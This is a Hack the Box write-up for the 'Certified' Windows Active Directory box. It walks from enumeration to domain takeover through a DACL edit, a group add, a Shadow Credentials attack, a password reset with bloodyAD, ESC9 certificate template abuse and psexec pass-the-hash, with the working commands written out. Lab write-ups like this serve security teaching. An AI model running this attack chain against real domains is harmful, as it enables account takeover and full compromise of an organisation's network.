
![image](https://github.com/user-attachments/assets/15668012-ec35-4684-8d22-4623da8cf147)

<br>

Platform : <br>**Hack the Box**
<br>

Box : <br>**Certified**
<br>

Difficulty : <br>**Medium**
<br>

OS : <br>**Windows Active Directory**
<br>

Author : <br>**Francesco Basile**

<br><br>

We start the assessment with a full port nmap scan, which gives the following results:

	$ nmap -p- -T4 --disable-arp-ping -Pn -n certified -oN nmap/all_ports.out                          
	Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-03 11:17 CET
	Nmap scan report for certified (10.10.11.41)
	Host is up (0.071s latency).
	Not shown: 65515 filtered ports
	PORT      STATE SERVICE
	53/tcp    open  domain
	88/tcp    open  kerberos-sec
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	389/tcp   open  ldap
	445/tcp   open  microsoft-ds
	464/tcp   open  kpasswd5
	593/tcp   open  http-rpc-epmap
	636/tcp   open  ldapssl
	3268/tcp  open  globalcatLDAP
	3269/tcp  open  globalcatLDAPssl
	9389/tcp  open  adws
	49666/tcp open  unknown
	49668/tcp open  unknown
	49669/tcp open  unknown
	49670/tcp open  unknown
	49677/tcp open  unknown
	49701/tcp open  unknown
	49725/tcp open  unknown
	55085/tcp open  unknown
	
	Nmap done: 1 IP address (1 host up) scanned in 492.87 seconds

<br><br>

We proceed with an in-depth versions scan:

	$ nmap -sVC --version-all -p53,88,135,139,445,464,593,636,3268,3269,9389 -Pn certified -oN nmap/versions_scan.out
	Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-03 11:28 CET
	Nmap scan report for certified (10.10.11.41)
	Host is up (0.090s latency).
	
	PORT     STATE SERVICE       VERSION
	53/tcp   open  domain?
	| fingerprint-strings: 
	|   DNSVersionBindReqTCP: 
	|     version
	|_    bind
	88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-03 17:28:19Z)
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ==certified.htb==0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName= ==DC01.certified.htb==
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:==DC01.certified.htb==
	| Not valid before: 2024-05-13T15:49:36
	|_Not valid after:  2025-05-13T15:49:36
	|_ssl-date: 2024-11-03T17:37:10+00:00; +7h00m00s from scanner time.
	445/tcp  open  microsoft-ds?
	464/tcp  open  kpasswd5?
	593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
	636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName= ==DC01.certified.htb==
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:==DC01.certified.htb==
	| Not valid before: 2024-05-13T15:49:36
	|_Not valid after:  2025-05-13T15:49:36
	|_ssl-date: 2024-11-03T17:37:09+00:00; +7h00m00s from scanner time.
	3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ==certified.htb==0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName= ==DC01.certified.htb==
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
	| Not valid before: 2024-05-13T15:49:36
	|_Not valid after:  2025-05-13T15:49:36
	|_ssl-date: 2024-11-03T17:37:10+00:00; +7h00m00s from scanner time.
	3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ==certified.htb==0., Site: Default-First-Site-Name)
	| ssl-cert: Subject: commonName= ==DC01.certified.htb==
	| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:==DC01.certified.htb==
	| Not valid before: 2024-05-13T15:49:36
	|_Not valid after:  2025-05-13T15:49:36
	|_ssl-date: 2024-11-03T17:37:09+00:00; +7h00m00s from scanner time.
	9389/tcp open  mc-nmf        .NET Message Framing
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port53-TCP:V=7.80%I=9%D=11/3%Time=67275047%P=x86_64-pc-linux-gnu%r(DNSV
	SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
	SF:x04bind\0\0\x10\0\x03");
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled and required
	| smb2-time: 
	|   date: 2024-11-03T17:36:32
	|_  start_date: N/A
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 539.11 seconds

<br><br>

Let's quickly look if we can easily retrieve some more sub-domains:

	$ dig any @10.10.11.41 certified.htb
	
	; <<>> DiG 9.18.28-0ubuntu0.22.04.1-Ubuntu <<>> any @10.10.11.41 certified.htb
	; (1 server found)
	;; global options: +cmd
	;; Got answer:
	;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 55140
	;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2
	
	;; OPT PSEUDOSECTION:
	; EDNS: version: 0, flags:; udp: 4000
	;; QUESTION SECTION:
	;certified.htb.			IN	ANY
	
	;; ANSWER SECTION:
	certified.htb.		600	IN	A	10.10.11.41
	certified.htb.		3600	IN	NS	dc01.certified.htb.
	certified.htb.		3600	IN	SOA	dc01.certified.htb. hostmaster.certified.htb. 165 900 600 86400 3600
	
	;; ADDITIONAL SECTION:
	dc01.certified.htb.	3600	IN	A	10.10.11.41
	
	;; Query time: 72 msec
	;; SERVER: 10.10.11.41#53(10.10.11.41) (TCP)
	;; WHEN: Sun Nov 03 11:43:50 CET 2024
	;; MSG SIZE  rcvd: 140

<br>

We got 'hostmaster.certified.htb' as a result, but won't be much useful for the CTF purpose.
At this point, given that we are provided with a set of credentials, to keep it like real life Windows pentests,
we can start enumerating with the following pair of creds:

<br>

	judith.mader:judith09

<br><br>

Net Exec for example gives us the shares hosted on the box:

<br>

	$ nxc smb 10.10.11.41 -d certified.htb -u judith.mader -p judith09 --shares
	SMB         10.10.11.41     445    DC01             ADMIN$                      Remote Admin
	SMB         10.10.11.41     445    DC01             C$                          Default share
	SMB         10.10.11.41     445    DC01             IPC$            READ        Remote IPC
	SMB         10.10.11.41     445    DC01             NETLOGON        READ        Logon server share 
	SMB         10.10.11.41     445    DC01             SYSVOL          READ        Logon server share

<br>

Unfortunately we don't find anything useful in them. We can try to access later with a new set of credetnials to see if anything changes.

<br><br>

rpcclient immediatly let us retrieve a _list of users_:

	$ rpcclient -U "judith.mader%judith09" certified   
	rpcclient $> enumdomusers
	user:[Administrator] rid:[0x1f4]
	user:[Guest] rid:[0x1f5]
	user:[krbtgt] rid:[0x1f6]
	user:[judith.mader] rid:[0x44f]
	user:[management_svc] rid:[0x451]
	user:[ca_operator] rid:[0x452]
	user:[alexander.huges] rid:[0x641]
	user:[harry.wilson] rid:[0x642]
	user:[gregory.cameron] rid:[0x643]

<br>

management_svc seems quite important and also ca_operator, along with the machine's name suggests that we're dealing with *AD CS*. 

<br><br>

Enumerating Password Policy shows that minimum password length it is 7 chars, password complexity is turned off (this means users can choose short and weak passwords) and most importantly there is no *Account Lockout Threshold*, which means we can *bruteforce* account withouth fearing that they get locked out. In a regular pentest, we would have fired responder at the *beginning* of the assessment, and now we would be spraying judith's password over all the users we found, but i won't show that here cause is not useful to the CTF purpose.

<br>

![Pasted image 20241105185001](https://github.com/user-attachments/assets/842fd77b-705f-4838-b560-5379bfb095b3)

<br><br>

Next step is ldapdomaindump, a useful tool which collects ldap data and gives results in various formats like html and json. 
I like it cause it gives back lists of objects like users, groups and computers with a nice output. This is the command used:

<br>

	$ ldapdomaindump -u 'certified.htb\judith.mader' -p 'judith09' 10.10.11.41

<br>

Among the groups, we see 'Management' which is not built-in:

<br>

![Pasted image 20241109153921](https://github.com/user-attachments/assets/e9603464-397e-4ea7-9289-62828735567c)

<br>

And seems related to management_svc user we found before. 

<br><br>

Let's continue investigating with bloodhound-python and see what comes back:

<br>

	$ bloodhound-python -u 'judith.mader' -p 'judith09' -ns 10.10.11.41 -d certified.htb -c all

<br><br>

After importing data, first thing i check is judith's ACLs to see if she can manipulate other objects in the domain:

<br>

![Pasted image 20241109153504](https://github.com/user-attachments/assets/ef94ecd2-0c56-410c-8f43-20a29d0cb835)

<br><br>

And Bloodhound shows that judith.mader owns Management, the group which has _GenericWrite_ on management_svc:

<br>

![Pasted image 20241109155012](https://github.com/user-attachments/assets/669f3ac5-2602-49cb-ac1d-d15d6f659024)

<br>

![Pasted image 20241109155051](https://github.com/user-attachments/assets/a4cf237d-d311-463b-8bc4-1aa8bb0ec366)

<br><br>

At this point we have a clear attack path, which basically brings us to *Shadow Credentials Attack*.

<br>

https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab

<br><br>

First we have to make some changes in the domain before we can perform the attack. We can simply follow BloodHound instructions:

	1. Grant judith the AddMember privilege on the group
	2. Effectively make judith add herself to the group

<br><br>

Edit the DACL with dacledit.py to grant judith the _AddMember_ privilege:

<br>

	$ dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' certified.htb/judith.mader:judith09

<br>

![Pasted image 20241106013432](https://github.com/user-attachments/assets/00b7ab95-7705-4898-9b2b-98906bcecd67)

<br><br>

Using net rpc to add judith itself to 'management' group and then check if everything went well by listing group's users:

<br>

	$ net rpc group addmem "management" "judith.mader" -U "CERTIFIED.HTB"/"judith.mader"%"judith09" -S "certified"

<br>

Check if we succeded:

<br>

	$ net rpc group members "management" -U "certified.htb"/"judith.mader"%"judith09" -S "certified"

<br>
 
![Pasted image 20241106013509](https://github.com/user-attachments/assets/3bf87dfc-7fa3-40e0-851e-639626fdd12a)

<br><br>

We did. Now that we can write to management_svc attributes, we can do some interesting things like make the user *kerberoastable*, and use *pywhisker* or *certipy* to perform *Shadow Credentials attack* and retrieve the user's hash. Certipy looks a lot easier, so let's try with that one first.

<br>

    $ certipy shadow auto -username judith.mader@certified.htb -p judith09 -account management_svc

<br>

![Pasted image 20241109163017](https://github.com/user-attachments/assets/35362d9a-eccc-4552-aeb2-2426fe919ebd)

<br>

_We succed and retrieve the hash._

<br>

	management_svc:a091BLABLABLA5584

<br><br>

We have access to another user. 

<br>

    Apparently the box is supposed to have winrm access, 
    and management_svc it is listed in BloodHound as CanPSRemote, 
    but for some reason port 5985 on the box is currently filtered. 
    Checking around in the HTB Forum Certified discussion, looks like 
	
	1: The box _is rootable_ even withouth a shell 
	2: We're gonna have to work our way around for now.
	
<br><br>

The hash is not crackable, tried john and hashcat with various rules sets.
I run BloodHound again, marking first user management_svc as owned. And again by checking ACL we find _something interesting_:

<br>

![Pasted image 20241109164820](https://github.com/user-attachments/assets/9a69576f-44c8-423d-ac4d-97590337debe)

<br><br>

GenericAll means that we can even _reset_ that user's password withouth the user itself to be notified. BloodHound suggests to use the samba's net tool, net rpc which can also perform pass-the-hash with pth-toolkit's net tool (https://github.com/byt3bl33d3r/pth-toolkit).However, i couldn't get this tool to work. I knew that _BloodyAD_ can perform this type of actions too, so let's try:

<br>

	$ bloodyAD -d certified.htb -u management_svc -p :a091BLABLABLA5584 --host 10.10.11.41 set password ca_operator 'Password1'

<br>

![Pasted image 20241109175105](https://github.com/user-attachments/assets/c1e50b6c-d56c-4c65-881b-234bb24382f4)

<br><br>

_Success_. ca_operator's *new password* it is now 'Password1'.
As we own a new user, what to do now it is straightforward. Mark it as owned on BloodHound and check ACLs, but nothing comes back. 
Since we know we are dealing with certificates, and we have a powerful tool like certipy, let's try his 'find' method which will collect 
more information about certificate authority which we can read through BloodHound:

<br>

	$ certipy find -dc-ip 10.10.11.41 -u ca_operator -p Password1

<br>

Now we see in BloodHound that ca_operator can enroll to the template CertifiedAuthentication
(it means they have the permissions needed to *request or obtain a certificate* based on that specific template)
and by reading the .txt file generated from certipy our path becomes clear: 

<br>

	Certificate Templates
	  0
	    Template Name                       : CertifiedAuthentication
	    Display Name                        : Certified Authentication
	    Certificate Authorities             : certified-DC01-CA
	    Enabled                             : True
	    Client Authentication               : True
	    Enrollment Agent                    : False
	    Any Purpose                         : False
	    Enrollee Supplies Subject           : False
	    Certificate Name Flag               : SubjectRequireDirectoryPath
	                                          SubjectAltRequireUpn
	    Enrollment Flag                     : NoSecurityExtension
	                                          AutoEnrollment
	                                          PublishToDs
	    Private Key Flag                    : 16777216
	                                          65536
	    Extended Key Usage                  : Server Authentication
	                                          Client Authentication
	    Requires Manager Approval           : False
	    Requires Key Archival               : False
	    Authorized Signatures Required      : 0
	    Validity Period                     : 1000 years
	    Renewal Period                      : 6 weeks
	    Minimum RSA Key Length              : 2048
	    Permissions
	      Enrollment Permissions
	        Enrollment Rights               : CERTIFIED.HTB\operator ca
	                                          CERTIFIED.HTB\Domain Admins
	                                          CERTIFIED.HTB\Enterprise Admins
	      Object Control Permissions
	        Owner                           : CERTIFIED.HTB\Administrator
	        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
	                                          CERTIFIED.HTB\Enterprise Admins
	                                          CERTIFIED.HTB\Administrator
	        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
	                                          CERTIFIED.HTB\Enterprise Admins
	                                          CERTIFIED.HTB\Administrator
	        Write Property Principals       : CERTIFIED.HTB\Domain Admins
	                                          CERTIFIED.HTB\Enterprise Admins
	                                          CERTIFIED.HTB\Administrator
	    [!] Vulnerabilities
	      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension

<br><br>

_ESC9_. These (ESC1, ESC2, etc.) are a series of vulnerabilities that can be find inside AD CS. Here a useful read:

<br>

https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7

<br><br>

In our case, if a user has permissions to enroll in certain AD Certificate Templates, they can request certificates that 
allow them to impersonate other users. Including *Domain Admins*. Requisites for ESC9 are:

<br>

	GenericWrite over any account A to compromise any account B

<br><br>

It looks like we're set. To perform the attack we just need the hash of the user allowed to enroll in the certificate template. 
This is an easy one. We set the password to be Password1. Quick visit to https://www.browserling.com/tools/ntlm-hash gives us the hash.

<br>

	64f12cddaa88057e06a81b54e73b949b
	
<br><br>

We start by updating the ca_operator account to administrator:

<br>

    $ certipy account update -username management_svc@certified.htb -hashes a091BLABLABLA5584 -user ca_operator -upn administrator

<br>

![Pasted image 20241109174958](https://github.com/user-attachments/assets/d341d033-84f2-4e07-abfb-9aa075da6d09)

<br><br>

Then we have to request the certificate on behalf of administrator:

<br>

	$ certipy req -username ca_operator@certified.htb -hashes 64f12cddaa88057e06a81b54e73b949b -ca certified-DC01-CA -template CertifiedAuthentication

<br>

![Pasted image 20241106075929](https://github.com/user-attachments/assets/1dc57512-106a-4c3b-b365-9f028b3229b2)

<br><br>

Revert ca_operator account to normal:

<br>

	$ certipy account update -username management_svc@certified.htb -hashes a091BLABLABLA5584 -user ca_operator -upn ca_operator@certified.htb

<br>

![Pasted image 20241109174845](https://github.com/user-attachments/assets/d49bb779-6745-4b15-920f-c0c7ba319257)

<br><br>

And get administrator _TGT and hashes_:

<br>

	$ certipy auth -pfx administrator.pfx -domain certified.htb

<br>

![Pasted image 20241109174537](https://github.com/user-attachments/assets/ea83202d-8a5a-48a5-b7ac-3e87eaeb0177)

<br><br>

Get Administrator shell:

<br>

	$ psexec.py 'certified.htb/Administrator@10.10.11.41' -hashes aad3bBLABLABLA2d34

<br>

![Pasted image 20241109174656](https://github.com/user-attachments/assets/4da4a479-1d13-4d81-bc7e-fa4c06d94002)

<br><br>

Getting user.txt and root.txt togheter:

<br>

![Pasted image 20241109174733](https://github.com/user-attachments/assets/1c1ff99c-a98d-4320-8eca-40bf3f6b9002)

